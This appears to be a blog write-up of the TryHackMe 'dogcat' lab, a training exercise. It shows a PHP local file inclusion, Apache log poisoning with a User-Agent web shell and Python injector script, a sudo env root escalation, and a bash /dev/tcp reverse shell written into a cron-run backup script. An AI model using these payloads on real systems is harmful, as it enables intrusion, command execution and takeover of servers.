+++
title = 'TryHackMe Dogcat writeup'
date = 2023-12-01T20:11:40+01:00
draft = false
tags = ['tryhackme', 'writeup']
+++

Today we are going to be taking a look at the **[dogcat](https://tryhackme.com/room/dogcat)** room and hopefully try and solve it.

# Room info

* ## Description

I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.

* ## Objective

Find all the four flags in the box.

# Tools

The tools that we are going to be using are:

* **Nmap**
* **Metasploit**

# Steps

First let begin with a simple nmap scan to get an idea about the open ports the box have.

```bash
sudo nmap -sC -sV xx.xx.xx.xx
```

which outputs the following:

``` console
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-01 20:17 +01
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:17
Completed NSE at 20:17, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:17
Completed NSE at 20:17, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:17
Completed NSE at 20:17, 0.00s elapsed
Unable to split netmask from target expression: "nmap/initial"
Initiating Ping Scan at 20:17
Scanning 10.10.71.178 [4 ports]
Completed Ping Scan at 20:17, 0.29s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:17
Completed Parallel DNS resolution of 1 host. at 20:17, 6.66s elapsed
Initiating SYN Stealth Scan at 20:17
Scanning 10.10.71.178 [1000 ports]
Discovered open port 22/tcp on 10.10.71.178
Increasing send delay for 10.10.71.178 from 0 to 5 due to 38 out of 126 dropped probes since last increase.
Completed SYN Stealth Scan at 20:17, 8.10s elapsed (1000 total ports)
Initiating Service scan at 20:17
Scanning 1 service on 10.10.71.178
Completed Service scan at 20:17, 1.91s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 10.10.71.178
Retrying OS detection (try #2) against 10.10.71.178
Retrying OS detection (try #3) against 10.10.71.178
Retrying OS detection (try #4) against 10.10.71.178
Retrying OS detection (try #5) against 10.10.71.178
NSE: Script scanning 10.10.71.178.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:18
Completed NSE at 20:18, 5.62s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:18
Completed NSE at 20:18, 0.01s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:18
Completed NSE at 20:18, 0.00s elapsed
Nmap scan report for 10.10.71.178
Host is up, received echo-reply ttl 63 (0.13s latency).
Scanned at 2023-12-01 20:17:44 +01 for 30s
Not shown: 998 closed tcp ports (reset)
PORT   STATE    SERVICE REASON              VERSION
22/tcp open     ssh     syn-ack ttl 63      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCeKBugyQF6HXEU3mbcoDHQrassdoNtJToZ9jaNj4Sj9MrWISOmr0qkxNx2sHPxz89dR0ilnjCyT3YgcI5rtcwGT9RtSwlxcol5KuDveQGO8iYDgC/tjYYC9kefS1ymnbm0I4foYZh9S+erXAaXMO2Iac6nYk8jtkS2hg+vAx+7+5i4fiaLovQSYLd1R2Mu0DLnUIP7jJ1645aqYMnXxp/bi30SpJCchHeMx7zsBJpAMfpY9SYyz4jcgCGhEygvZ0jWJ+qx76/kaujl4IMZXarWAqchYufg57Hqb7KJE216q4MUUSHou1TPhJjVqk92a9rMUU2VZHJhERfMxFHVwn3H
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBouHlbsFayrqWaldHlTkZkkyVCu3jXPO1lT3oWtx/6dINbYBv0MTdTAMgXKtg6M/CVQGfjQqFS2l2wwj/4rT0s=
|   256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIfp73VYZTWg6dtrDGS/d5NoJjoc4q0Fi0Gsg3Dl+M3I
80/tcp filtered http    host-unreach ttl 63
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=12/1%OT=22%CT=1%CU=33672%PV=Y%DS=2%DC=I%G=Y%TM=656A
OS:3176%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)
OS:OPS(O1=M509ST11NW6%O2=M509ST11NW6%O3=M509NNT11NW6%O4=M509ST11NW6%O5=M509
OS:ST11NW6%O6=M509ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)
OS:ECN(R=Y%DF=Y%T=40%W=F507%O=M509NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40
OS:%CD=S)

Uptime guess: 46.466 days (since Mon Oct 16 09:07:03 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:18
Completed NSE at 20:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:18
Completed NSE at 20:18, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:18
Completed NSE at 20:18, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.99 seconds
           Raw packets sent: 1196 (56.698KB) | Rcvd: 1159 (51.759KB)
```

we can see that there are two ports open, the first being port **22** for **ssh** and the second one is port **80** for **apache**.

Accessing the webpage that is hosted on box at `http://xx.xx.xx.xx:80/`, we see:

<img src="/images/tryhackme-writeups/dogcat/dogcat-webpage.png" />

we have two buttons, **A dog** and **A cat** button, they both redirect to `/?view=dog` and `/?view=cat` respectivly, which then loads an image of a cat or a dog.

the source of the webpage doesn't seem to have any hidden messages or code that we can take advantage of as you can see:

``` php
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        Here you go!<img src="dogs/8.jpg" />
    </div>
</body>

</html>
```
> __**index.php**__

after couple of minute trying to detect what other directories the website may seem to have other then **/dog** and **/cat**, i tried to access the **/etc/passwd** file in the box using the same url that those images are getting loaded from `http://xx.xx.xx.xx/dog/../../../../etc/passwd` but this just yield an error.
After doing some research, i came across [LFI](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/) which means **Local File Inclusion**, in other words we can try to trick the web server into exposing its files.
we can do this using the following:

``` console
http://xx.xx.xx.xx/?view=php://filter/read=convert.base64-encode/resource=./dog/../index
```
the output is:

``` php
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        Here you go!PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==    </div>
</body>

</html>
```

After decoding the base64 encoded text we get the page's source code:

``` php
<?php
    function containsStr($str, $substr) {
        return strpos($str, $substr) !== false;
    }
    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
        if(isset($_GET['view'])) {
            if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                echo 'Here you go!';
                include $_GET['view'] . $ext;
            } else {
                echo 'Sorry, only dogs or cats are allowed.';
            }
    }
?>
```

We can see that the webserver have an extra parameter, **ext** which if left empty will be set to .php, we can take advantage of it and access other file types, let's try and access the **/etc/passwd**

``` console
http://xx.xx.xx.xx/?view=php://filter/read=convert.base64-encode/resource=./dog/../../../../etc/passwd&ext=
```

and again afer decoding we get:

``` console
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

> __**/etc/passwd**__

unfortunately nothing here would allow us to get into the box.

since we can access the box's files, we can try to perform a **log poisoning**, we know that there is an **apache** server running so let's access it's logs file:

``` console
http://xx.xx.xx.xx/?view=./dog/../../../../../../../var/log/apache2/access.log&ext
```

we get the **apache** server logs:

``` console
10.18.91.159 - - [01/Dec/2023:18:27:19 +0000] "GET /cgi-sys/finger.pl HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
10.18.91.159 - - [01/Dec/2023:18:27:19 +0000] "GET /cgi-local/finger.pl HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
10.18.91.159 - - [01/Dec/2023:18:27:19 +0000] "GET /htbin/finger.pl HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
```

since the logs also shows the **User-Agent** parameter, we can try to inject a php script that we can use for code execution. The script will add a third parameter called `cmd` which will take in a command and execute it.

``` php
<?php system($_GET['cmd']);?>
```

i created a python script that will inject the php script and print out the logs to the output of the command that we choose to pass in the `cmd` parameter:

``` python
import requests

payload = "<?php system($_GET['cmd']);?>"
headers = {
    "User-Agent": payload
}
cmd = "whoami"

url = f"http://xx.xx.xx.xx/?view=./dog/../../../../../../../var/log/apache2/access.log&ext&cmd={cmd}"

response = requests.get(url, headers)

print(response.text)
```

after running it we will get **www-data** instead of the **User-Agent**:

``` console
10.18.91.159 - - [01/Dec/2023:19:04:19 +0000] "GET /?view=php://filter/read=convert.base64-encode/resource=./dog/../../../../etc/passwd&ext&cmd=whoami HTTP/1.1" 200 1108 "-" "www-data"
```

now, let list the directory `/var/www/html`, we just need to change the command to `ls /var/www/html`.

we get:

``` console
cat.php
cats
dog.php
dogs
flag.php
index.php
style.css
test.php
```
and here is our first flag in the **flag.php** file we can access like it so:

``` console
http://xx.xx.xx.xx/?view=php://filter/read=convert.base64-encode/resource=./dog/../flag.php&ext=
```
now if we list the directory `/var/www/` we will find the second flag in a file named **flag2_QMW7JvaY2LvK.txt**

Since we can execute commands, we can get a reverse shell, checkout [revshells.com](https://www.revshells.com/) to quicly generate a command to create a reverse shell with python, bash, perl ...etc. I will be using metasploit.

after getting a reverse shell we can try and see what we can run as **sudo** using the command `sudo -l`

``` bash
User www-data may run the following commands on 5ab1679239ec:
    (root) NOPASSWD: /usr/bin/env
```

We can run `/usr/bin/env` as root with no password required, this will help us escalate our previeleges to root, we can do that using the command:

``` bash
sudo /usr/bin/env /bin/bash
```

now that we are root let take a look at the `/root` directory and see what we can find:

``` console
flag3.txt
```

and voila we find the third flag in the **flag3.txt** file.

the forth flag is outside the box, because this box is a container running inside an other box. We can see this if we go into `/opt/backups` and looking around the backups archive, we also see that the archibe has a very recent date when compared to the script, so that must mean the script is ran regurarly on the parent box.

We can take advantage of this and get ourselves a reverse shell on the parent box:

``` bash
echo "#!/bin/bash" > backup.sh
echo "/bin/bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/1234 0>&1'" >> backup.sh
```

After few minutes we should get a connection from the parent box and then when we list our current directory we see the forth flag in a **flag4.txt** file:

``` console
flag4.txt
```

# Ressources

* [Blog post explaining LFI, and how to exploit it.](https://www.aptive.co.uk/blog/local-file-inclusion-lfi-testing/)
* [CyberChef for decoding.](https://gchq.github.io/CyberChef/)
* [szymex73's writeup which helped me figure out how to get the 4th flag.](https://blog.szymex.pw/thm/dogcat.html)
